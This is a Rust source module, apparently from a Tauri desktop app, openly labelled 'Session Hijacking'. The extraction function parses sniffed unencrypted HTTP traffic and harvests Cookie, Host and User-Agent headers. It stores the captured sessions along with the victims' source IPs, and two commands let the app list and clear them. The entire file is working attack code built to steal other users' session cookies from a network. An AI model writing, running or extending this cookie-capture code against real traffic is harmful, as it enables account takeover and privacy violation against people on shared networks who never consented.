/// Session Hijacking - Capture HTTP cookies from non-HTTPS traffic
/// Note: Only captures cookies from unencrypted HTTP connections

#[derive(serde::Serialize, Clone)]
pub struct CapturedSession {
    pub timestamp: i64,
    pub source_ip: String,
    pub destination: String,
    pub host: String,
    pub cookies: Vec<CookieData>,
    pub user_agent: Option<String>,
}

#[derive(serde::Serialize, Clone)]
pub struct CookieData {
    pub name: String,
    pub value: String,
    pub domain: Option<String>,
}

// In-memory session storage
use std::sync::Mutex;
use once_cell::sync::Lazy;

static CAPTURED_SESSIONS: Lazy<Mutex<Vec<CapturedSession>>> = Lazy::new(|| Mutex::new(Vec::new()));

/// Get all captured sessions
#[tauri::command]
pub fn get_captured_sessions() -> Result<Vec<CapturedSession>, String> {
    let sessions = CAPTURED_SESSIONS.lock().map_err(|e| e.to_string())?;
    Ok(sessions.clone())
}

/// Clear captured sessions
#[tauri::command]
pub fn clear_sessions() -> Result<(), String> {
    let mut sessions = CAPTURED_SESSIONS.lock().map_err(|e| e.to_string())?;
    sessions.clear();
    Ok(())
}

/// Parse HTTP packet for cookies (called from sniffer)
pub fn extract_cookies_from_http(payload: &str, src_ip: &str, dst_ip: &str) -> Option<CapturedSession> {
    // Look for Cookie header
    let mut cookies = Vec::new();
    let mut host = String::new();
    let mut user_agent = None;
    
    for line in payload.lines() {
        let line_lower = line.to_lowercase();
        
        if line_lower.starts_with("cookie:") {
            let cookie_str = line[7..].trim();
            for part in cookie_str.split(';') {
                let part = part.trim();
                if let Some(eq_pos) = part.find('=') {
                    cookies.push(CookieData {
                        name: part[..eq_pos].to_string(),
                        value: part[eq_pos+1..].to_string(),
                        domain: None,
                    });
                }
            }
        } else if line_lower.starts_with("host:") {
            host = line[5..].trim().to_string();
        } else if line_lower.starts_with("user-agent:") {
            user_agent = Some(line[11..].trim().to_string());
        }
    }
    
    if cookies.is_empty() {
        return None;
    }
    
    let session = CapturedSession {
        timestamp: std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs() as i64,
        source_ip: src_ip.to_string(),
        destination: dst_ip.to_string(),
        host,
        cookies,
        user_agent,
    };
    
    // Store session
    if let Ok(mut sessions) = CAPTURED_SESSIONS.lock() {
        sessions.push(session.clone());
        // Keep only last 100
        if sessions.len() > 100 {
            sessions.remove(0);
        }
    }
    
    Some(session)
}
